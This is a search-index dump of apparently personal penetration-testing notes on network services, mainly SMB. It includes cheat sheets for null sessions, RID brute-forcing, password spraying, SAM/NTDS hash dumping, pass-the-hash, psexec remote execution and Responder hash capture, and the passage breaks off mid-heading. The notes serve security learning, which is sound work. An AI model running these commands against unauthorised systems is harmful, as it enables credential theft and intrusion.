{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to Hacking Life!","text":"<p>HackingLife is born from the urge to document the knowledge acquired in the cybersecurity field and the need of being able to retrieve it. </p> <p>But there is something else: I strongly believe there is not much difference between fixing a broken faucet (or opening a lock, or studying the engine of your car, or walking in the countryside, or\u2026) and assessing an environment and describing its vulnerabilities. As a matter of fact, I spend my time doing all these things: fixing, repairing, and creating narratives (yes, writing too) in which magically all parts work together harmonically (or provoke the end of the world harmonically too). Tadam! </p>","tags":["pentesting","cybersecurity"]},{"location":"#second-brain","title":"Second brain","text":"<p>It's quite intriguing how brains work because it doesn't matter how much information and resources you have available on the Internet, still, this is something you need to do for and by yourself if you want to understand in a deep sense what you are doing, keep track of it and so on.</p> <p>So to be more than clear again: the main reason for this repository to exist is purely selfish. It's me being able to retrieve my notes and build upon them a second brain. Therefore, there is no intention of being exhaustive or giving thoughful explanations about how things work on a deep level.</p>","tags":["pentesting","cybersecurity"]},{"location":"#acknowledgments","title":"Acknowledgments","text":"<p>Nevertheless (and to be fair) this idea is deeply inspired by Lyz-code and their Blue book. Thanks to this inspiring, polished, and... overwhelming repository I've found a way to start making sense of all my notes. Kudos!</p> <p>Finally, I would like to highlight that this content may not be entirely original, as I've included some paragraphs directly from different sources. Most of the time, I've included a section at the top of the page to quote sources. </p>","tags":["pentesting","cybersecurity"]},{"location":"0-255-ICMP-internet-control-message-protocol/","title":"0-255 icmp","text":"<p>Internet Control Message Protocol (ICMP) is a protocol used by devices to communicate with each other on the Internet for various purposes, including error reporting and status information. It sends requests and messages between device:</p> <p>ICMP Requests: A request is a message sent by one device to another to request information or perform a specific action. </p> <ul> <li>Echo Request: This message tests whether a device is reachable on the network. When a device sends an echo request, it expects to receive an echo reply message. For example, the tools <code>tracert</code> (Windows) or <code>traceroute</code> (Linux) always send ICMP echo requests.</li> <li>Timestamp Request: This message determines the time on a remote device.</li> <li>Address Mask Request: This message is used to request the subnet mask of a device.</li> </ul> <p>ICMP Messages: A message in ICMP can be either a request or a reply. In addition to ping requests and responses, ICMP supports other types of messages, such as error messages, destination unreachable, and time exceeded messages. </p> <ul> <li>Echo reply: This message is sent in response to an echo request message.</li> <li>Destination unreachable: This message is sent when a device cannot deliver a packet to its destination.</li> <li>Redirect: A router sends this message to inform a device that it should send its packets to a different router.</li> <li>time exceeded: This message is sent when a packet has taken too long to reach its destination.</li> <li>Parameter problem: This message is sent when there is a problem with a packet's header.</li> <li>Source quench: This message is sent when a device receives packets too quickly and cannot keep up. It is used to slow down the flow of packets.</li> </ul>"},{"location":"1090-java-rmi/","title":"1090 Pentesting Java RMI","text":"<p>The Java Remote Method Invocation (RMI) system allows an object running in one Java virtual machine to invoke methods on an object running in another Java virtual machine. RMI provides for remote communication between programs written in the Java programming language.</p> <p>A Java RMI registry is a simplified name service that allows clients to get a reference (a stub) to a remote object.</p> <p>When developers want to make their Java objects available within the network, they usually bind them to an RMI registry. The registry stores all information required to connect to the object (IP address, listening port, implemented class or interface and the ObjID value) and makes it available under a human readable name (the bound name). Clients that want to consume the RMI service ask the RMI registry for the corresponding bound name and the registry returns all required information to connect. Thus, the situation is basically the same as with an ordinary DNS service.</p>","tags":["java rmi","port 1090"]},{"location":"1090-java-rmi/#enumeration","title":"Enumeration","text":"<pre><code># Dump information from the RMI registry.\nnmap --script rmi-dumpregistry -p 1099 &lt;target&gt;\n</code></pre> <p>In this example, the name bound to the RMI server is\u00a0CustomRMIServer. It implements the\u00a0<code>java.rmi.Remote</code>\u00a0interface, as you would have expected. That is how one can invoke methods on the server remotely.</p> <p></p> <p>remote-method-guesser is a Java RMI vulnerability scanner that is capable of identifying common RMI vulnerabilities automatically. Whenever you identify an RMI endpoint, you should give it a try:</p> <pre><code>rmg enum $ip 9010\n</code></pre>","tags":["java rmi","port 1090"]},{"location":"110-143-993-995-imap-pop3/","title":"Ports 110, 143, 993, 995 IMAP POP3","text":"<p>A\u00a0<code>mail server</code>\u00a0(sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. When we download emails to our email application, it will connect to a\u00a0<code>POP3</code>\u00a0or\u00a0<code>IMAP4</code>\u00a0server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.</p> <ul> <li>By default,\u00a0<code>POP3</code>\u00a0clients remove downloaded messages from the email server.</li> <li>On the other hand, by default,\u00a0<code>IMAP4</code>\u00a0clients do not remove downloaded messages from the email server.</li> </ul> <p>IMAP allows online management of emails directly on the server and supports folder structures. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails. IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously. IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Depending on the method and implementation used, the encrypted connection uses the standard port <code>143</code> or an alternative port such as <code>993</code>.</p> <p>POP3 only provides listing, retrieving, and deleting emails as functions at the email server. Depending on the method and implementation used, the encrypted connection uses the standard port <code>110</code> or an alternative port such as <code>995</code>.</p>","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"110-143-993-995-imap-pop3/#footprinting-imap-pop3","title":"Footprinting IMAP / POP3","text":"<pre><code>sudo nmap $ip -sV -p110,143,993,995 -sC\n</code></pre> Port Service <code>TCP/25</code> SMTP Unencrypted <code>TCP/143</code> IMAP4 Unencrypted <code>TCP/110</code> POP3 Unencrypted <code>TCP/465</code> SMTP Encrypted <code>TCP/587</code> SMTP Encrypted/STARTTLS <code>TCP/993</code> IMAP4 Encrypted <code>TCP/995</code> POP3 Encrypted <p>We can use the\u00a0<code>Mail eXchanger</code>\u00a0(<code>MX</code>) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. I</p> <pre><code> host -t MX example.com\n host -t A mail.example.com\n</code></pre> <pre><code> dig mx example.do | grep \"MX\" | grep -v \";\"\n dig mx example.com | grep \"MX\" | grep -v \";\"\n</code></pre>","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"110-143-993-995-imap-pop3/#connect-to-an-imap-pop3-server","title":"Connect to an IMAP /POP3 server","text":"<pre><code>curl -k 'imaps://$ip' --user user:p4ssw0rd -v\n</code></pre> <p>To interact with the IMAP or POP3 server over SSL, we can use <code>openssl</code>, as well as <code>ncat</code>. The commands for this would look like this:</p> <pre><code>openssl s_client -connect $ip:pop3s\n</code></pre> <pre><code>openssl s_client -connect $ip:imaps\n</code></pre> <pre><code># Connect to POP server with telnet\ntelnet @ip 110\n</code></pre>","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"110-143-993-995-imap-pop3/#basic-imap-commands","title":"Basic IMAP commands","text":"<pre><code># User's login\na LOGIN username password\n\n# Lists all directories\na LIST \"\" *\n\n# Creates a mailbox with a specified name\na CREATE \"INBOX\" \n\n# Deletes a mailbox\na DELETE \"INBOX\" \n\n# Renames a mailbox\na RENAME \"ToRead\" \"Important\"\n\n# Returns a subset of names from the set of names that the User has declared as being active or subscribed\na LSUB \"\" *\n\n# Selects a mailbox so that messages in the mailbox can be accessed\na SELECT INBOX\n\n# Exits the selected mailbox\na UNSELECT INBOX\n\n# Retrieves data (parts of the message) associated with a message in the mailbox\na FETCH &lt;ID&gt; all\n# If you want to retrieve the body:\na FETCH &lt;ID&gt; BODY.PEEK[TEXT]\n\n# Removes all messages with the `Deleted` flag set\na CLOSE\n\n# Closes the connection with the IMAP server\na LOGOUT\n</code></pre>","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"110-143-993-995-imap-pop3/#basic-pop3-commands","title":"Basic POP3 commands","text":"<pre><code># Connect to POP server with telnet\ntelnet @ip 110\n</code></pre> <pre><code># Identifies the user\nUSER username\n\n# Authentication of the user using its password\nPASS password\n\n# Requests the number of saved emails from the server\nSTAT\n\n# Requests from the server the number and size of all emails\nLIST \n\n# Requests the server to deliver the requested email by ID\nRETR id\n\n# Requests the server to delete the requested email by ID\nDELE id\n\n# Requests the server to display the server capabilities\nCAPA\n\n# Requests the server to reset the transmitted information\nRSET\n\n# Closes the connection with the POP3 server\nQUIT\n</code></pre>","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"110-143-993-995-imap-pop3/#misconfigurations-in-an-email-server","title":"Misconfigurations in an email server","text":"Setting Description <code>auth_debug</code> Enables all authentication debug logging. <code>auth_debug_passwords</code> This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. <code>auth_verbose</code> Logs unsuccessful authentication attempts and their reasons. <code>auth_verbose_passwords</code> Passwords used for authentication are logged and can also be truncated. <code>auth_anonymous_username</code> This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"110-143-993-995-imap-pop3/#installing-a-mail-server-evolution","title":"Installing a mail server: Evolution","text":"<pre><code>sudo apt-get install evolution\n</code></pre>","tags":["port 110","port 143","port 993","port 995","imap","pop3"]},{"location":"111-32731-rpc/","title":"Port 111, 32731 -  rpc","text":"<p>Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service. See rpcclient.</p> <p>Default port: 111/TCP/UDP, 32771 in Oracle Solaris.</p> <p>RPCBind + NFS</p>","tags":["port 111","rpc","NFS","Network File System"]},{"location":"135-windows-management-instrumentation-wmi/","title":"Port 135 - Windows Management Instrumentation (<code>WMI</code>)","text":"<p>Windows Management Instrumentation (<code>WMI</code>) is Microsoft's implementation and also an extension of the Common Information Model (<code>CIM</code>), core functionality of the standardized Web-Based Enterprise Management (<code>WBEM</code>) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (<code>WMIC</code>). WMI is not a single program but consists of several programs and various databases, also known as repositories.</p>","tags":["tools","port 135","wmi"]},{"location":"135-windows-management-instrumentation-wmi/#footprinting-the-service","title":"Footprinting the service","text":"<p>The initialization of the WMI communication always takes place on TCP port 135, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this.</p> <pre><code>/usr/share/doc/python3-impacket/examples/wmiexec.py &lt;username&gt;:&lt;\"password\"&gt;@$ip &lt;hostname&gt;\n</code></pre> <pre><code># Prints the patch level and description of the Hotfixes applied\nwmic qfe get Caption,Description,HotFixID,InstalledOn   \n\n# Displays basic host information to include any attributes within the list\nwmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List  \n\n# A listing of all processes on host\nwmic process list /format:list  \n\n# Displays information about the Domain and Domain Controllers\nwmic ntdomain list /format:list \n\n#Displays information about all local accounts and any domain accounts that have logged into the device\nwmic useraccount list /format:list  \n\n# Information about all local groups\nwmic group list /format:list    \n\n# Dumps information about any system accounts that are being used as service accounts.\nwmic sysaccount list /format:list   \n</code></pre>","tags":["tools","port 135","wmi"]},{"location":"137-138-139-445-smb/","title":"Ports 137, 138, 139, 445 SMB","text":"<p><code>Server Message Block</code> (<code>SMB</code>) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. It runs mainly on Windows, BUT with the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.</p> <p>Basically a SMB server provides arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. </p> <p>Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port\u00a0<code>139</code>\u00a0and UDP ports\u00a0<code>137</code>\u00a0and\u00a0<code>138</code>. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port\u00a0<code>445</code>\u00a0without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover. Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.</p> <p>Samba is an alternative variant to the SMB server, developed for Unix-based operating system. Samba implements the <code>Common Internet File System</code> (<code>CIFS</code>) network protocol. CIFS is a \"dialect\" of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as <code>SMB / CIFS</code>. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports <code>137</code>, <code>138</code>, <code>139</code>, but CIFS uses TCP port <code>445</code> only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.</p> SMB Version Supported Features CIFS Windows NT 4.0 Communication via NetBIOS interface SMB 1.0 Windows 2000 Direct connection via TCP SMB 2.0 Windows Vista, Windows Server 2008 Performance upgrades, improved message signing, caching feature SMB 2.1 Windows 7, Windows Server 2008 R2 Locking mechanisms SMB 3.0 Windows 8, Windows Server 2012 Multichannel connections, end-to-end encryption, remote storage access SMB 3.0.2 Windows 8.1, Windows Server 2012 R2 SMB 3.1.1 Windows 10, Windows Server 2016 Integrity checking, AES-128 encryption <ul> <li>On Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP</li> <li>but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.</li> </ul> <p>In a network, each host participates in the same <code>workgroup</code>. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an <code>application programming interface</code> (<code>API</code>) for networking computers called the <code>Network Basic Input/Output System</code> (<code>NetBIOS</code>). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called <code>name registration</code> procedure. Either each host reserves its hostname on the network, or the NetBIOS Name Server (<code>NBNS</code>) is used for this purpose. It also has been enhanced to Windows Internet Name Service (<code>WINS</code>).</p> <p>Another protocol that is commonly related to SMB is MSRPC (Microsoft Remote Procedure Call). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, </p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#footprinting-smb","title":"Footprinting smb","text":"<p>nmap</p> <pre><code>sudo nmap $ip -sV -sC -p139,445\n\n# Script for nteracting with the SMB service to extract the reported operating system version.\nnmap --script smb-os-discovery.nse -p445 $ip\n\n# Service scanning\nnmap -A -p445 $ip\n</code></pre> <p>smbmap</p> <pre><code># Enumerate network shares and access associated permissions.\nsmbmap -H $ip \n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#enumeration","title":"Enumeration","text":"","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#smbmap","title":"SMBMap","text":"<p>SMBMap tool is widely used and helpful for the enumeration of SMB services. Quick cheat sheet:</p> <pre><code># Enumerate network shares and access associated permissions.\nsmbmap -H $ip\n\n# # Enumerate network shares and access associated permissions with recursivity\nsmbmap -H $ip -r\n\n# Download a file from a specific share folder\nsmbmap -H $ip --download \"folder\\file.txt\"\n\n# Upload a file to a specific share folder\nsmbmap -H $ip --upload originfile.txt \"targetfolder\\file.txt\"\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#smbclient-protocol-negotiation-failed-troubleshooting","title":"SMBClient: Protocol Negotiation Failed Troubleshooting","text":"<p>Null session connection:</p> <pre><code># Connect to smb [-L|--list=HOST] : Selecting the targeted host for the connection request.\nsmbclient -L -N //$ip\n# -N: Suppresses the password prompt.\n# -L: retrieve a list of available shares on the remote host\n</code></pre> <p>By default smbclient will connect using SMBv1. If you receive the error message protocol negotiation failed when connecting, add the argument -m SMB2 or -m SMB3 to specify SMBv2 or SMBv3 as the minimum security protocol to use when accessing the server. </p> <pre><code>smbclient -L //$ip -U username -m SMB2\n</code></pre> <p>You can use this feature to evaluate what the minimum SMB version is for the server: </p> <pre><code>smbclient -L //$ip -U username -m NT1 \nsmbclient -L //$ip -U username -m SMB2 \nsmbclient -L //$ip -U username -m SMB3 \n</code></pre> <p>If all succeed, then the server supports all versions of SMB (including legacy versions, which exposes the server to attack). If one or more fail, the next one that succeeds is the minimum SMB version supported.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#rpcclient","title":"rpcclient","text":"<p>See RPC installation and basic commands.</p> <p>The <code>rpcclient</code> offers us many different requests with which we can execute specific functions on the SMB server to get information. A list of some of these functions can be found at rpcclient.  Most importantly, anonymous access to such services can also lead to the discovery of other users (see list of commands for rpcclient tool, who can be attacked with brute-forcing in the most aggressive case.</p> <p>Brute forcing user enumeration with rpcclient:</p> <pre><code>for i in $(seq 500 1100);do rpcclient -N -U \"\" $ip -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n</code></pre> <p>Quick cheat sheet:</p> <pre><code># Connect to a remote shared folder (same as smbclient in this regard)\nrpcclient -U \"\" $ip\n# rpcclient -U'%' $ip\n\n# Server information\nsrvinfo\n\n# Enumerate all domains that are deployed in the network \nenumdomains\n\n# Provides domain, server, and user information of deployed domains.\nquerydominfo\n\n# Enumerates all available shares.\nnetshareenumall\n\n# Provides information about a specific share.\nnetsharegetinfo &lt;share&gt;\n\n# Enumerates all domain users.\nenumdomusers\n\n# Provides information about a specific user.\nqueryuser &lt;RID&gt;\n    # An example:\n    # rpcclient $&gt; queryuser 0x3e8\n\n# Provides information about a specific group.\nquerygroup &lt;ID&gt;\n\n# Enumerate domain groups\nenumalsgroups domain\n\n# Enumerate local system groups\nenumalsgroups builtin\n\n# Enumerate domain information\nenumdomains\n\n# Enumerate user system privileges\nenumprivs\n\n# Enumerate Windows password policy information\ngetdompwinfo\n\n# Create a new user on the remote Windows system using rpcclient with the createdomuser username command. \ncreatedomuser username rpcclient \nsetuserinfo2 username 24 'NewPassword' \n# In this example, the 24 value represents necessary Windows information class constant to set a user password. The value will always be 24 when setting a password.\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#enum4linux","title":"Enum4Linux","text":"<p>Complete cheat sheet. Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:</p> <pre><code>./enum4linux-ng.py $ip -A -C\n</code></pre> <p>Quick cheat sheet:</p> <pre><code># Enumerate shares\nenum4linux.exe -S $ip\n\n# Enumerate users\nenum4linux.exe -U $ip \u00a0 \u00a0 \n\n# Enumerate machine list\nenum4linux.exe -M $ip\n\n# Display the password policy in case you need to mount a network authentification attack\nenum4linux.exe -enuP $ip\n\n# Specify username to use (default \u201c\u201d)\nenum4linux.exe -u $ip\n\n# Specify password to use (default \u201c\u201d)\nenum4linux.exe -p $ip \u00a0 \u00a0 \n\n# Also you can use brute force by adding a file\nenum4linux.exe -s /usr/share/enum4linux/share-list.txt $ip \u00a0\n\n# Do a nmblookup (similar to nbtstat)\nenum4linux.exe -n $ip \u00a0\n# In the result we see the &lt;20&gt; flag which means there are resources shared\n\n# Enumerates the password policy in the remote system. This is useful to use brute force\nenum4linux.exe -P $ip\n\n# Enumerates available shares\nenum4linux.exe -s $ip     \n</code></pre> <p>If you want to run all these commands in one line:</p> <pre><code>enum4linux.exe -a $ip\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#samrdump-from-impacket","title":"samrdump from impacket","text":"<p>An alternative for user enumeration would be a Python script from Impacket called samrdump.py.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#crackmapexec","title":"CrackMapExec","text":"<p>CrackMapExec is widely used and helpful for the enumeration of SMB services.</p> <pre><code>crackmapexec smb $ip --shares -u '' -p ''\n</code></pre> <p>Quick cheat sheet:</p> <pre><code># Check if we can access a machine\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt;\n\n# Spraying password technique\ncrackmapexec smb $ip -u /folder/userlist.txt -p '&lt;password&gt;' --local-auth --continue-on-success\n# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list\n# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth.\n\n# Check which machines we can access in a subnet\ncrackmapexec smb $ip/24 -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt;\n\n# Get sam: extract hashes from all users authenticated in the machine \ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --sam\n\n# Get the ntds.dit, given that your user has permissions\ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --ntds\n\n# See shares\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --shares\n\n# Enumerate active sessions\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --sessions\n\n# Enumerate users of the domain\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --users\n\n# Enumerate logged on users\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --loggedon-users\n\n# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)\ncrackmapexec smb $ip -u &lt;username&gt; -H &lt;hash&gt; -d &lt;DOMAIN&gt;\n\n# Execute commands with flag -x\ncrackmapexec smb $ip/24 -u &lt;Administrator&gt; -d . -H &lt;hash&gt; -x whoami\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#typical-attacks","title":"Typical attacks","text":"<p>For some of these attacks we will use smbclient. See  installation, connection and syntax in smbclient.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#1-null-attack","title":"1. Null attack","text":"<pre><code># Connect to smb [-L|--list=HOST] : Selecting the targeted host for the connection request.\nsmbclient -L -N //$ip\n# -N: Suppresses the password prompt.\n# -L: retrieve a list of available shares on the remote host\n</code></pre> <p>Smbclient will attempt to connect to the remote host and check if there is any authentication required. If there is, it will ask you for a password for your local username. If we do not specify a specific username to smbclient when attempting to connect to the remote host, it will just use your local machine's username.</p> <p>Without parameter -N, password will be prompted. We leave the password field blank, simply hitting Enter to tell the script to move along.</p> <p>After authenticating, we may obtain access to some typical shared folders, such as:</p> <pre><code>ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.\n\nC$ - Administrative share for the C:\\ disk volume. This is where the operating system is hosted.\n\nIPC$ - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system.\nWorkShares - Custom share. \n</code></pre> <p>We will try to connect to each of the shares except for the IPC$ one, which is not valuable for us since it is not browsable as any regular directory would be and does not contain any files that we could use at this stage of our learning experience: </p> <pre><code># the use of / and \\ might be different if you need to escape some characters\nsmbclient \\\\\\\\$ip\\\\ADMIN$\n\n# download file.txt\nget file.txt\n\n# List files\n!ls\n\n# Cat a file.txt\n!cat file.txt\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#2-smb2-security-levels","title":"2. smb2 security levels","text":"<p>To detect it, run:</p> <pre><code>nmap --script smb2-security-mode -p 445 $ip\n# Add -Pn to avoid firewall if needed\n</code></pre> <p>Output: </p> <pre><code> smb2-security-mode:\n\n|   2.02:\n\n|_    Message signing enabled but not required\n</code></pre> <p>There are three potential results for the message signing:</p> <p>1. Message signing disabled. </p> <p>2. Message signing enabled but not required (default for SMB2).</p> <p>3. Message signing enabled and required.</p> <p>Options 1 and 2 are vulnerable to SMB relay attacks.  Option 3 is the most secure option.</p> <p>In case 1, attack is similar to the first vuln. In the second case, we can bypass login, leaving in blank the password, but including the user in the request:</p> <pre><code>smbclient -L \\\\$ip -U Administrator\n# -L: retrieve a list of available shares on the remote host\n# -U: user \n\nsmbclient -N -L \\\\$ip\n# -N: Suppresses the password prompt.\n</code></pre> <p>Important: Sometimes some jugling is needed:</p> <pre><code>smbclient -N -L \\\\$ip\nsmbclient -N -L \\\\\\\\$ip\nsmbclient -N -L /\\/\\$ip\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#3-signing-enabled-but-not-required","title":"3. Signing enabled but not required","text":"<p>HackTheBox machine: Tactics </p> <p>After running a nmap with scripts enabled (nmap -sC -A 10.129.228.98  -Pn -p-), you get this response:</p> <pre><code>| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n</code></pre> <p>This will allow us to use smbclient share enumeration without the need of providing a password when signing into the shared folder. For that we will use a well known user in Windows: Administrator.</p> <pre><code>smbclient -L $ip -U Administrator\n</code></pre> <p>Same thing is possible with rpcclient:</p> <pre><code># Connect to a remote shared folder (same as smbclient in this regard)\nrpcclient -U \"\" $ip\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#4-brute-force","title":"4. Brute force","text":"","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#user-enumeration-with-rpcclient","title":"User enumeration with rpcclient","text":"<pre><code># Brute forcing user enumeration with rpcclient:\nfor i in $(seq 500 1100);do rpcclient -N -U \"\" $ip -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#password-spraying-with-crackmapexec","title":"Password spraying with crackmapexec","text":"<pre><code>crackmapexec smb $ip -u /folder/userlist.txt -p '&lt;password&gt;' --local-auth --continue-on-success\n# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list\n# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth.\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#module-smb_login-in-metasploit","title":"Module smb_login in metasploit","text":"<p>With metasploit, use the module: <code>auxiliary/scanner/smb/smb_login</code></p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#5-remote-code-execution-rce-with-psexec-smbexec-crackmapexec","title":"5. Remote Code Execution (RCE) with PsExec, SmbExec, crackMapExec","text":"<p>PsExec\u00a0is a tool from SysInternals Suite that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a\u00a0named pipe\u00a0that can send commands to the system.</p> <p>Alternatives to PsExec from SysInternals: Impacket PsExec, Impacket SMBExec, Impacket atexec\u00a0(This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command), CrackMapExec\u00a0, Metasploit PsExec\u00a0- Ruby PsExec implementation.</p> <pre><code># Connect to a remote machine with a local administrator account\nimpacket-psexec administrator:'&lt;password&gt;'@$ip\n\n# Connect to a remote machine with a local administrator account\nimpacket-smbexec administrator:'&lt;password&gt;'@$ip\n\n# Connect to a remote machine with a local administrator account\nimpacket-atexec  administrator:'&lt;password&gt;'@$ip\n</code></pre> <p>RCE with crackmapexec:</p> <pre><code>#  If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.\ncrackmapexec smb $ip -u Administrator -p '&lt;password&gt;' -x 'whoami' --exec-method smbexec\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#6-pass-the-hash-pth-with-crackmapexec","title":"6. Pass the Hash (PtH) with crackmapexec","text":"<pre><code># Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)\ncrackmapexec smb $ip -u &lt;username&gt; -H &lt;hash&gt; -d &lt;DOMAIN&gt;)\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#7-forced-authentication-attacks","title":"7. Forced Authentication Attacks","text":"<p>We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes. The most common tool to perform such operations is the Responder. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. </p> <pre><code>./Responder.py -I [interface] -w -d\n# -I: Set interface \n# -w: Start the WPAD rogue proxy server. Default value is False\n# -d: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False\n\n# In the HTB machine responder:\n./Responder.py -I tun0 -w -d\n</code></pre> <p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.</p> <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre> <p>If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#8-ntlm-relay-attack","title":"8. NTLM relay 